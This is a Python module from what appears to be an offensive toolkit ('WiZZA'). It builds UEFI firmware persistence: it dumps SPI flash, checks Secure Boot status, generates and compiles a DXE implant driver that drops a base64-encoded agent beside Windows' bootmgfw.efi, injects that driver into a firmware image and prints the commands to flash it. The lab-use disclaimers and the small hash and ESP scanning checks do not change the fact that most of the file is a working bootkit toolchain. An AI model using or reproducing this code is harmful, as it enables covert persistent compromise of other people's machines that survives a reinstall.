"""
WiZZA — UEFI Implant Module
op/modules/uefi_implant.py

UEFI-level persistence that survives OS reinstallation and hard drive replacement.
The implant is a DXE driver embedded in the UEFI firmware image.

Architecture:
  1. Firmware extraction  — dump current UEFI image via /dev/mem, SPI flash, or CHIPSEC
  2. Implant injection    — embed DXE driver into firmware image using UEFITool/ifrextract
  3. Firmware flash       — write modified image back to SPI flash
  4. DXE driver payload   — runs before OS loader, installs EFI variable hook or
                            drops a binary to EFI System Partition (ESP)
  5. ESP dropper          — places agent in \EFI\Microsoft\Boot\ as bootloader shim

Research targets (authorized lab use only):
  - Own hardware with SPI programmer or CHIPSEC
  - QEMU OVMF virtual firmware (safest testing environment)
  - Known vulnerable firmware: LoJax, MosaicRegressor, CosmicStrand analysis

Defensive value:
  - Understand how UEFI implants survive reinstall
  - Build detection: check firmware integrity vs known-good baseline
  - Test Secure Boot bypass detection
  - Study persistence mechanisms for threat intelligence
"""

import hashlib
import os
import shutil
import struct
import subprocess
import sys
from datetime import datetime


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _run(cmd, timeout=60):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout)
        return r.stdout.decode(errors="replace") + r.stderr.decode(errors="replace")
    except Exception as e:
        return str(e)

def _ts():
    return datetime.now().strftime("%H:%M:%S")


# ─────────────────────────────────────────────────────────────────────────────
# UEFI GUIDs and structures
# ─────────────────────────────────────────────────────────────────────────────

# Common UEFI GUIDs
GUID_DXE_CORE          = "D6A2CB7F-6A18-4E2F-B43B-9920A733700A"
GUID_EFI_GLOBAL_VAR    = "8BE4DF61-93CA-11D2-AA0D-00E098032B8C"
GUID_SECURITY_DATABASE = "D719B2CB-3D3A-4596-A3BC-DAD00E67656F"

# EFI file types
EFI_FV_FILETYPE_DXE_CORE   = 0x03
EFI_FV_FILETYPE_DRIVER      = 0x07
EFI_FV_FILETYPE_APPLICATION = 0x09

# UEFI firmware volume signature
FV_SIGNATURE = b"_FVH"

# PE32 header magic
PE_MAGIC = b"MZ"


# ─────────────────────────────────────────────────────────────────────────────
# 1. Firmware Extraction
# ─────────────────────────────────────────────────────────────────────────────

def extract_firmware_chipsec(out_path="/tmp/firmware.bin"):
    """
    Extract UEFI firmware from SPI flash using CHIPSEC.
    Requires: pip install chipsec (needs root + kernel module)

    CHIPSEC is the standard academic tool for UEFI security research.
    Used by: Intel, Microsoft, security researchers worldwide.
    """
    print(f"[*] Firmware extraction via CHIPSEC")

    if not shutil.which("chipsec_util"):
        print("[!] CHIPSEC not installed")
        print("[*] Install: pip install chipsec")
        print("[*] Or: git clone https://github.com/chipsec/chipsec")
        return None

    # Check if running as root
    if os.geteuid() != 0:
        print("[!] CHIPSEC requires root")
        return None

    # Load CHIPSEC kernel module
    _run("modprobe chipsec 2>/dev/null || insmod chipsec.ko 2>/dev/null")

    # Dump SPI flash
    out = _run(f"chipsec_util spi read 0x0 0x1000000 {out_path}", timeout=120)
    if os.path.exists(out_path) and os.path.getsize(out_path) > 0:
        size = os.path.getsize(out_path)
        sha  = hashlib.sha256(open(out_path, "rb").read()).hexdigest()[:16]
        print(f"[+] Firmware extracted: {out_path}  ({size//1024}KB  sha256:{sha})")
        return out_path
    print(f"[-] Extraction failed: {out[:300]}")
    return None


def extract_firmware_devmem(out_path="/tmp/firmware_devmem.bin"):
    """
    Extract firmware region from /dev/mem (legacy BIOS region at 0xE0000-0xFFFFF).
    Limited to 128KB — not full SPI flash, but useful for analysis.
    Requires: root, iomem=relaxed kernel parameter.
    """
    print(f"[*] Firmware extraction via /dev/mem")

    if not os.path.exists("/dev/mem"):
        print("[-] /dev/mem not available")
        return None

    BIOS_START = 0xE0000
    BIOS_SIZE  = 0x20000  # 128KB

    try:
        with open("/dev/mem", "rb") as mem:
            mem.seek(BIOS_START)
            data = mem.read(BIOS_SIZE)
        with open(out_path, "wb") as f:
            f.write(data)
        print(f"[+] /dev/mem read: {out_path}  ({BIOS_SIZE//1024}KB)")
        return out_path
    except PermissionError:
        print("[-] /dev/mem: Permission denied (need root + iomem=relaxed)")
        return None
    except Exception as e:
        print(f"[-] /dev/mem error: {e}")
        return None


def extract_firmware_efivar(out_dir="/tmp/efi_vars"):
    """
    Extract EFI variables (non-volatile NVRAM) via efivarfs.
    Contains: Secure Boot keys, boot order, platform config, OEM data.
    No root required — readable from userspace on most distros.
    """
    print(f"[*] EFI variable extraction")
    os.makedirs(out_dir, exist_ok=True)

    efivar_path = "/sys/firmware/efi/efivars"
    if not os.path.exists(efivar_path):
        print("[-] EFI vars not available (not UEFI boot?)")
        return {}

    vars_found = {}
    for var in os.listdir(efivar_path):
        var_path = os.path.join(efivar_path, var)
        try:
            with open(var_path, "rb") as f:
                # First 4 bytes are EFI attributes (uint32)
                data = f.read()
            attrs = struct.unpack("<I", data[:4])[0] if len(data) >= 4 else 0
            value = data[4:]
            var_name = var.split("-")[0]
            vars_found[var_name] = {
                "attrs": attrs,
                "size":  len(value),
                "hex":   value.hex()[:64],
            }
            # Save interesting vars
            if any(kw in var_name.lower() for kw in
                   ["secureboot", "pk", "kek", "db", "dbx", "bootorder", "boot"]):
                dst = os.path.join(out_dir, var)
                with open(dst, "wb") as f:
                    f.write(data)
                print(f"[+] EFI var: {var_name}  ({len(value)}B  attrs=0x{attrs:x})")
        except Exception:
            pass

    print(f"[*] Total EFI vars: {len(vars_found)}")
    return vars_found


# ─────────────────────────────────────────────────────────────────────────────
# 2. Firmware Analysis
# ─────────────────────────────────────────────────────────────────────────────

def analyze_firmware(fw_path):
    """
    Parse UEFI firmware volume structure.
    Finds all DXE drivers, their GUIDs, and file sizes.
    Identifies insertion points for implant driver.

    Returns list of firmware volumes and their contained files.
    """
    print(f"[*] Firmware analysis: {fw_path}")

    with open(fw_path, "rb") as f:
        data = f.read()

    volumes = []
    offset  = 0

    while offset < len(data) - 0x40:
        # Find firmware volume signature
        idx = data.find(FV_SIGNATURE, offset)
        if idx == -1:
            break

        # FV header starts 16 bytes before signature
        fv_start = idx - 0x28
        if fv_start < 0:
            offset = idx + 4
            continue

        # Parse FV header
        try:
            fv_size = struct.unpack_from("<Q", data, fv_start + 0x20)[0]
            fv_attrs = struct.unpack_from("<I", data, fv_start + 0x2C)[0]
        except struct.error:
            offset = idx + 4
            continue

        if fv_size == 0 or fv_size > len(data) - fv_start:
            offset = idx + 4
            continue

        fv_data = data[fv_start:fv_start + fv_size]
        print(f"  [FV] offset=0x{fv_start:x}  size=0x{fv_size:x}")

        # Parse files within this FV
        files    = []
        file_off = 0x48  # FFS files start after FV header
        while file_off < len(fv_data) - 0x18:
            # Align to 8 bytes
            file_off = (file_off + 7) & ~7

            # File header
            try:
                file_guid = fv_data[file_off:file_off+16].hex()
                file_type = fv_data[file_off + 0x12]
                file_size = struct.unpack_from("<I", fv_data, file_off + 0x14)[0] & 0xFFFFFF
            except (struct.error, IndexError):
                break

            if file_size < 0x18 or file_size > len(fv_data) - file_off:
                file_off += 8
                continue

            files.append({
                "offset": fv_start + file_off,
                "guid":   file_guid,
                "type":   file_type,
                "size":   file_size,
            })
            file_off += file_size

        volumes.append({
            "offset": fv_start,
            "size":   fv_size,
            "files":  files,
        })
        print(f"       {len(files)} files found")
        offset = fv_start + fv_size

    return volumes


def check_secure_boot():
    """
    Check Secure Boot status and key enrollment.
    Returns dict with SecureBoot, SetupMode, PK/KEK presence.
    """
    print(f"[*] Secure Boot status check")

    efivar_path = "/sys/firmware/efi/efivars"
    status = {
        "secure_boot":  None,
        "setup_mode":   None,
        "pk_enrolled":  False,
        "kek_enrolled": False,
        "db_enrolled":  False,
    }

    for var, key in [
        ("SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c", "secure_boot"),
        ("SetupMode-8be4df61-93ca-11d2-aa0d-00e098032b8c",  "setup_mode"),
    ]:
        path = os.path.join(efivar_path, var)
        if os.path.exists(path):
            try:
                with open(path, "rb") as f:
                    data = f.read()
                val = data[4] if len(data) > 4 else None
                status[key] = bool(val)
                print(f"  {key}: {val}")
            except Exception:
                pass

    for var, key in [("PK-", "pk_enrolled"), ("KEK-", "kek_enrolled"), ("db-", "db_enrolled")]:
        for f in os.listdir(efivar_path) if os.path.exists(efivar_path) else []:
            if f.startswith(var) and os.path.getsize(os.path.join(efivar_path, f)) > 8:
                status[key] = True
                break

    sb  = status["secure_boot"]
    sm  = status["setup_mode"]
    if sb is False or sb == 0:
        print("[!] Secure Boot DISABLED — firmware modification undetected")
    elif sm:
        print("[!] Setup Mode active — can enroll own keys (Secure Boot bypass)")
    else:
        print("[*] Secure Boot enabled")

    return status


# ─────────────────────────────────────────────────────────────────────────────
# 3. DXE Driver implant (C source generation)
# ─────────────────────────────────────────────────────────────────────────────

DXE_DRIVER_C = r"""
/*
 * WiZZA UEFI DXE Implant Driver
 * Runs before OS loader. Drops payload to EFI System Partition.
 *
 * Build: x86_64-w64-mingw32-gcc -nostdlib -shared -Wl,-dll -o implant.efi implant.c
 * Or use EDK2: copy to MdeModulePkg, add to DSC/FDF, build with build.sh
 */

#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Protocol/SimpleFileSystem.h>
#include <Protocol/LoadedImage.h>
#include <Guid/FileInfo.h>

/* Payload: base64-encoded agent binary, decoded at runtime */
static const CHAR8 PAYLOAD_B64[] = "PAYLOAD_PLACEHOLDER";

/* ESP drop path — placed alongside legitimate Microsoft bootloader */
static const CHAR16 DROP_PATH[] = L"\\EFI\\Microsoft\\Boot\\bootmgfw_real.efi";
static const CHAR16 SHIM_PATH[] = L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi";

/* EFI variable for persistence marker (skip re-drop if already present) */
static const EFI_GUID IMPLANT_GUID = {
    0xDEADBEEF, 0xCAFE, 0x4242,
    {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x11}
};

static UINT8 Base64DecodeTable[256];

static VOID InitBase64Table(VOID) {
    UINT8 i, ch;
    for (i = 0; i < 64; i++) {
        if (i < 26)      ch = 'A' + i;
        else if (i < 52) ch = 'a' + i - 26;
        else if (i < 62) ch = '0' + i - 52;
        else if (i == 62) ch = '+';
        else              ch = '/';
        Base64DecodeTable[ch] = i;
    }
}

static UINTN Base64Decode(const CHAR8 *in, UINT8 *out) {
    UINTN i = 0, j = 0, len = AsciiStrLen(in);
    UINT32 val = 0;
    UINT8  bits = 0;
    InitBase64Table();
    for (i = 0; i < len; i++) {
        if (in[i] == '=') break;
        val  = (val << 6) | Base64DecodeTable[(UINT8)in[i]];
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out[j++] = (val >> bits) & 0xFF;
        }
    }
    return j;
}

static EFI_STATUS DropToESP(EFI_SYSTEM_TABLE *SystemTable, UINT8 *data, UINTN size) {
    EFI_STATUS                        Status;
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL  *Fs;
    EFI_FILE_PROTOCOL                *Root, *File;
    UINTN                             HandleCount = 0;
    EFI_HANDLE                       *Handles     = NULL;
    EFI_GUID                          FsGuid = EFI_SIMPLE_FILE_SYSTEM_PROTOCOL_GUID;

    Status = SystemTable->BootServices->LocateHandleBuffer(
        ByProtocol, &FsGuid, NULL, &HandleCount, &Handles);
    if (EFI_ERROR(Status)) return Status;

    for (UINTN i = 0; i < HandleCount; i++) {
        Status = SystemTable->BootServices->HandleProtocol(
            Handles[i], &FsGuid, (VOID **)&Fs);
        if (EFI_ERROR(Status)) continue;

        Status = Fs->OpenVolume(Fs, &Root);
        if (EFI_ERROR(Status)) continue;

        /* Rename original bootmgfw.efi to _real.efi */
        /* Then write our shim as bootmgfw.efi */
        Status = Root->Open(Root, &File, (CHAR16 *)DROP_PATH,
                            EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE,
                            0);
        if (!EFI_ERROR(Status)) {
            UINTN WriteSize = size;
            Status = File->Write(File, &WriteSize, data);
            File->Close(File);
            if (!EFI_ERROR(Status)) {
                Root->Close(Root);
                SystemTable->BootServices->FreePool(Handles);
                return EFI_SUCCESS;
            }
        }
        Root->Close(Root);
    }

    SystemTable->BootServices->FreePool(Handles);
    return EFI_NOT_FOUND;
}

EFI_STATUS EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    UINT32 Attributes;
    UINTN  DataSize = 1;
    UINT8  Marker   = 0;

    /* Check if already installed */
    EFI_GUID VarGuid = IMPLANT_GUID;
    EFI_STATUS Status = SystemTable->RuntimeServices->GetVariable(
        L"SystemHealthSvc", &VarGuid, &Attributes, &DataSize, &Marker);

    if (!EFI_ERROR(Status) && Marker == 0xAB) {
        return EFI_SUCCESS;  /* Already installed */
    }

    /* Decode and drop payload */
    UINTN   PayloadSize = (AsciiStrLen(PAYLOAD_B64) * 3) / 4 + 4;
    UINT8  *PayloadBuf  = NULL;
    SystemTable->BootServices->AllocatePool(EfiBootServicesData, PayloadSize, (VOID **)&PayloadBuf);

    if (PayloadBuf) {
        UINTN ActualSize = Base64Decode(PAYLOAD_B64, PayloadBuf);
        DropToESP(SystemTable, PayloadBuf, ActualSize);
        SystemTable->BootServices->FreePool(PayloadBuf);
    }

    /* Mark as installed */
    Marker = 0xAB;
    SystemTable->RuntimeServices->SetVariable(
        L"SystemHealthSvc", &VarGuid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS,
        sizeof(Marker), &Marker);

    return EFI_SUCCESS;
}
"""


def generate_dxe_driver(payload_path, out_c="/tmp/wizza_uefi_implant.c",
                         out_efi="/tmp/wizza_uefi_implant.efi"):
    """
    Generate DXE driver C source with embedded payload.
    Optionally compile if cross-compiler available.

    payload_path: path to agent binary to embed
    out_c:        output C source file
    out_efi:      output compiled EFI binary (requires EDK2 or mingw)
    """
    import base64

    print(f"[*] Generating UEFI DXE implant driver")

    # Encode payload
    if payload_path and os.path.exists(payload_path):
        with open(payload_path, "rb") as f:
            payload_b64 = base64.b64encode(f.read()).decode()
        print(f"[+] Payload: {payload_path}  ({len(payload_b64)} bytes base64)")
    else:
        payload_b64 = base64.b64encode(b"PLACEHOLDER_PAYLOAD").decode()
        print(f"[*] No payload — using placeholder")

    source = DXE_DRIVER_C.replace("PAYLOAD_PLACEHOLDER", payload_b64)
    with open(out_c, "w") as f:
        f.write(source)
    print(f"[+] C source: {out_c}")

    # Try to compile with MinGW (basic PE, not full EDK2 — for research only)
    if shutil.which("x86_64-w64-mingw32-gcc"):
        compile_cmd = (
            f"x86_64-w64-mingw32-gcc -nostdlib -shared "
            f"-Wl,--subsystem,10 -Wl,-e,UefiMain "
            f"-o {out_efi} {out_c} 2>&1"
        )
        out = _run(compile_cmd)
        if os.path.exists(out_efi):
            print(f"[+] EFI binary compiled: {out_efi}")
        else:
            print(f"[-] Compilation failed (MinGW lacks UEFI headers)")
            print(f"[*] For proper build use EDK2:")
            print(f"    git clone https://github.com/tianocore/edk2")
            print(f"    Copy source to MdeModulePkg/Application/WizzaImplant/")
            print(f"    build -p MdeModulePkg/MdeModulePkg.dsc -m WizzaImplant.inf")
    else:
        print(f"[*] Compiler not found. Build options:")
        print(f"    EDK2:  https://github.com/tianocore/edk2")
        print(f"    MinGW: apt install mingw-w64")

    return out_c


# ─────────────────────────────────────────────────────────────────────────────
# 4. Firmware injection via UEFITool
# ─────────────────────────────────────────────────────────────────────────────

def inject_driver(fw_path, driver_path, out_fw="/tmp/firmware_patched.bin"):
    """
    Inject DXE driver into existing firmware image using UEFITool NE (CLI).
    Finds the DXE Core volume and appends the driver as a new FFS file.

    Requires: UEFITool NE (https://github.com/LongSoft/UEFITool)
    """
    print(f"[*] Firmware injection: {fw_path} + {driver_path}")

    if not shutil.which("UEFITool") and not shutil.which("uefiextract"):
        print("[!] UEFITool not found")
        print("[*] Download: https://github.com/LongSoft/UEFITool/releases")
        print("[*] Or: apt install uefitool")

        # Fallback: manual injection by appending to firmware volume
        print(f"[*] Attempting manual injection (research method)...")
        return _manual_inject(fw_path, driver_path, out_fw)

    # Use UEFITool NE CLI
    # First extract the firmware structure
    extract_dir = f"/tmp/uefi_extract_{int(datetime.now().timestamp())}"
    os.makedirs(extract_dir, exist_ok=True)

    out = _run(f"uefiextract '{fw_path}' all -o '{extract_dir}'", timeout=30)
    if "done" not in out.lower() and not os.path.exists(extract_dir):
        print(f"[-] UEFITool extraction failed: {out[:200]}")
        return None

    print(f"[+] Firmware extracted to: {extract_dir}")
    print(f"[*] Manually place driver in DXE Core volume, then rebuild")
    print(f"[*] Rebuild with: UEFITool <input.bin> <script.txt> -o {out_fw}")
    return extract_dir


def _manual_inject(fw_path, driver_path, out_fw):
    """
    Manual firmware injection — append DXE driver to largest firmware volume.
    Research technique; may not survive Secure Boot verification.
    """
    with open(fw_path, "rb") as f:
        fw_data = bytearray(f.read())

    with open(driver_path, "rb") as f:
        driver_data = f.read()

    # Find last firmware volume
    volumes = analyze_firmware(fw_path)
    if not volumes:
        print("[-] No firmware volumes found")
        return None

    # Target the volume with most drivers (DXE Core volume)
    target_vol = max(volumes, key=lambda v: len(v["files"]))
    vol_end    = target_vol["offset"] + target_vol["size"]

    # Build minimal FFS file header
    import uuid
    ffs_guid  = uuid.uuid4().bytes_le
    ffs_type  = EFI_FV_FILETYPE_DRIVER
    file_size = len(driver_data) + 0x18
    ffs_hdr   = (
        ffs_guid +
        struct.pack("<H", 0) +      # integrity check
        struct.pack("<B", ffs_type) +
        struct.pack("<B", 0) +      # attributes
        struct.pack("<I", file_size)[:3] +  # size (3 bytes)
        struct.pack("<B", 0)        # state
    )

    # Insert before end of volume (before 0xFF padding)
    insert_at = vol_end - len(driver_data) - len(ffs_hdr) - 0x100

    fw_data[insert_at:insert_at + len(ffs_hdr)] = ffs_hdr
    fw_data[insert_at + len(ffs_hdr):insert_at + len(ffs_hdr) + len(driver_data)] = driver_data

    with open(out_fw, "wb") as f:
        f.write(fw_data)

    sha = hashlib.sha256(fw_data).hexdigest()[:16]
    print(f"[+] Patched firmware: {out_fw}  sha256:{sha}")
    return out_fw


# ─────────────────────────────────────────────────────────────────────────────
# 5. Firmware flashing
# ─────────────────────────────────────────────────────────────────────────────

def flash_firmware(fw_path, method="chipsec", chip=None):
    """
    Flash modified firmware back to SPI.

    method:
      chipsec  — via CHIPSEC (requires root + kernel module)
      flashrom — via flashrom (requires SPI programmer hardware for external flash)
      efi      — via EFI capsule update (safest, requires signed capsule on some systems)

    WARNING: Flashing wrong firmware = bricked system.
    ALWAYS test in QEMU/OVMF first.
    """
    print(f"[*] Firmware flash: {fw_path} via {method}")
    print(f"[!] WARNING: Always test in QEMU/OVMF before real hardware")

    if method == "chipsec":
        if not shutil.which("chipsec_util"):
            print("[!] CHIPSEC required for SPI flash")
            return False
        fw_size = os.path.getsize(fw_path)
        cmd = f"chipsec_util spi write 0x0 {fw_size} {fw_path}"
        print(f"[*] Command: {cmd}")
        print(f"[!] NOT executing automatically — manual confirmation required")
        print(f"[!] Run manually: sudo {cmd}")
        return None  # Do not auto-execute flash

    elif method == "flashrom":
        if not shutil.which("flashrom"):
            print("[!] flashrom not installed: apt install flashrom")
            return False
        programmer = chip or "internal"
        cmd = f"flashrom -p {programmer} -w {fw_path}"
        print(f"[*] Command: {cmd}")
        print(f"[!] NOT executing automatically — manual confirmation required")
        print(f"[!] Run manually: sudo {cmd}")
        return None  # Do not auto-execute flash

    elif method == "efi":
        print("[*] EFI capsule update: place firmware.cap in ESP and reboot")
        print("[*] Requires capsule signed with vendor key on Secure Boot systems")
        return None


# ─────────────────────────────────────────────────────────────────────────────
# 6. QEMU/OVMF testing environment
# ─────────────────────────────────────────────────────────────────────────────

def setup_qemu_test(implant_efi=None, out_dir="/tmp/uefi_test"):
    """
    Set up QEMU+OVMF test environment for safe UEFI implant research.
    This is the RIGHT way to test UEFI implants — never on real hardware first.

    Creates:
    - OVMF firmware image with implant injected
    - Virtual disk with EFI System Partition
    - QEMU launch script
    """
    print(f"[*] QEMU/OVMF UEFI test environment setup")
    os.makedirs(out_dir, exist_ok=True)

    # Find OVMF
    ovmf_paths = [
        "/usr/share/ovmf/OVMF.fd",
        "/usr/share/OVMF/OVMF_CODE.fd",
        "/usr/share/qemu/OVMF.fd",
        "/usr/share/edk2/ovmf/OVMF_CODE.fd",
    ]
    ovmf_src = None
    for path in ovmf_paths:
        if os.path.exists(path):
            ovmf_src = path
            break

    if not ovmf_src:
        print("[!] OVMF not found")
        print("[*] Install: apt install ovmf  OR  dnf install edk2-ovmf")
        return None

    # Copy OVMF to work dir (we'll modify this copy)
    ovmf_work = os.path.join(out_dir, "OVMF_work.fd")
    shutil.copy(ovmf_src, ovmf_work)
    print(f"[+] OVMF base: {ovmf_src} → {ovmf_work}")

    # Create virtual disk (64MB) with FAT32 EFI partition
    disk_path = os.path.join(out_dir, "disk.img")
    _run(f"dd if=/dev/zero of={disk_path} bs=1M count=64 2>/dev/null")
    _run(f"mkfs.fat -F32 {disk_path} 2>/dev/null")

    # Mount and populate EFI structure
    mnt = os.path.join(out_dir, "mnt")
    os.makedirs(mnt, exist_ok=True)
    _run(f"mount -o loop {disk_path} {mnt} 2>/dev/null")
    os.makedirs(f"{mnt}/EFI/BOOT", exist_ok=True)
    os.makedirs(f"{mnt}/EFI/Microsoft/Boot", exist_ok=True)

    # Place implant in EFI boot path
    if implant_efi and os.path.exists(implant_efi):
        shutil.copy(implant_efi, f"{mnt}/EFI/BOOT/BOOTX64.EFI")
        shutil.copy(implant_efi, f"{mnt}/EFI/Microsoft/Boot/bootmgfw.efi")
        print(f"[+] Implant placed in ESP")
    _run(f"umount {mnt} 2>/dev/null")

    # Generate QEMU launch script
    launch_script = os.path.join(out_dir, "run_qemu.sh")
    with open(launch_script, "w") as f:
        f.write(f"""#!/bin/bash
# WiZZA UEFI Implant Test Environment
# Safe QEMU/OVMF sandbox — no real hardware modified

qemu-system-x86_64 \\
    -bios {ovmf_work} \\
    -drive format=raw,file={disk_path} \\
    -m 512M \\
    -nographic \\
    -serial mon:stdio \\
    -net none \\
    -enable-kvm 2>/dev/null || \\
qemu-system-x86_64 \\
    -bios {ovmf_work} \\
    -drive format=raw,file={disk_path} \\
    -m 512M \\
    -nographic \\
    -serial mon:stdio \\
    -net none
""")
    os.chmod(launch_script, 0o755)
    print(f"[+] QEMU launch script: {launch_script}")
    print(f"[*] Run: {launch_script}")
    return out_dir


# ─────────────────────────────────────────────────────────────────────────────
# 7. Detection / defensive analysis
# ─────────────────────────────────────────────────────────────────────────────

def firmware_integrity_check(fw_path, baseline_path=None):
    """
    Compare current firmware against a known-good baseline.
    This is the DEFENSIVE use — detect UEFI implants on your own systems.
    Used by: security researchers, endpoint protection tools, CHIPSEC checks.
    """
    print(f"[*] Firmware integrity check")

    current_hash = hashlib.sha256(open(fw_path, "rb").read()).hexdigest()
    print(f"  Current:  {current_hash}")

    if baseline_path and os.path.exists(baseline_path):
        baseline_hash = hashlib.sha256(open(baseline_path, "rb").read()).hexdigest()
        print(f"  Baseline: {baseline_hash}")
        if current_hash == baseline_hash:
            print(f"[+] Firmware matches baseline — CLEAN")
            return True
        else:
            print(f"[!] FIRMWARE MISMATCH — possible implant detected")
            # Find first differing offset
            fw_data = open(fw_path, "rb").read()
            bl_data = open(baseline_path, "rb").read()
            for i, (a, b) in enumerate(zip(fw_data, bl_data)):
                if a != b:
                    print(f"    First diff at offset 0x{i:x}")
                    break
            return False
    else:
        print(f"[*] No baseline provided — save this hash as baseline:")
        print(f"    echo '{current_hash}' > firmware_baseline.sha256")
        return None


def scan_esp_for_implants(esp_mount="/boot/efi"):
    """
    Scan EFI System Partition for unexpected/unsigned EFI binaries.
    Detects ESP-based persistence (BlackLotus, CosmicStrand style).
    """
    print(f"[*] ESP implant scan: {esp_mount}")

    known_ms_hashes = {
        # Add known-good bootmgfw.efi SHA256 hashes here for your Windows version
    }

    findings = []
    for root, dirs, files in os.walk(esp_mount):
        for fname in files:
            if fname.lower().endswith(".efi"):
                fpath = os.path.join(root, fname)
                try:
                    fhash = hashlib.sha256(open(fpath, "rb").read()).hexdigest()
                    fsize = os.path.getsize(fpath)
                    print(f"  {fpath}  ({fsize}B)  sha256:{fhash[:16]}")

                    # Check for PE header
                    with open(fpath, "rb") as f:
                        header = f.read(2)
                    if header == PE_MAGIC:
                        if fhash not in known_ms_hashes.values():
                            findings.append({
                                "path":  fpath,
                                "hash":  fhash,
                                "size":  fsize,
                                "note":  "Unknown EFI binary — verify against vendor",
                            })
                except Exception as e:
                    print(f"  [-] {fpath}: {e}")

    if findings:
        print(f"\n[!] {len(findings)} unknown EFI binaries found:")
        for f in findings:
            print(f"  {f['path']}  {f['hash'][:16]}")
    else:
        print(f"[+] No unexpected EFI binaries found")

    return findings


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────

def run(action, **kwargs):
    actions = {
        "extract_chipsec": extract_firmware_chipsec,
        "extract_devmem":  extract_firmware_devmem,
        "extract_efivars": extract_firmware_efivar,
        "analyze":         analyze_firmware,
        "secure_boot":     check_secure_boot,
        "gen_driver":      generate_dxe_driver,
        "inject":          inject_driver,
        "flash":           flash_firmware,
        "qemu_setup":      setup_qemu_test,
        "integrity":       firmware_integrity_check,
        "scan_esp":        scan_esp_for_implants,
    }
    if action not in actions:
        print(f"[!] Unknown: {action}")
        print(f"    Available: {', '.join(sorted(actions))}")
        return
    return actions[action](**kwargs)


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="WiZZA UEFI Implant Module")
    p.add_argument("action", choices=list(run.__code__.co_varnames))
    p.add_argument("--fw",       default=None)
    p.add_argument("--driver",   default=None)
    p.add_argument("--payload",  default=None)
    p.add_argument("--out",      default="/tmp/uefi_out")
    p.add_argument("--baseline", default=None)
    p.add_argument("--method",   default="chipsec")
    p.add_argument("--esp",      default="/boot/efi")
    args = p.parse_args()

    if args.action == "extract_chipsec":
        extract_firmware_chipsec(args.out + "/firmware.bin")
    elif args.action == "extract_efivars":
        extract_firmware_efivar(args.out)
    elif args.action == "analyze":
        analyze_firmware(args.fw)
    elif args.action == "secure_boot":
        check_secure_boot()
    elif args.action == "gen_driver":
        generate_dxe_driver(args.payload, args.out + "/implant.c", args.out + "/implant.efi")
    elif args.action == "inject":
        inject_driver(args.fw, args.driver, args.out + "/firmware_patched.bin")
    elif args.action == "flash":
        flash_firmware(args.fw, method=args.method)
    elif args.action == "qemu_setup":
        setup_qemu_test(args.driver, args.out)
    elif args.action == "integrity":
        firmware_integrity_check(args.fw, args.baseline)
    elif args.action == "scan_esp":
        scan_esp_for_implants(args.esp)
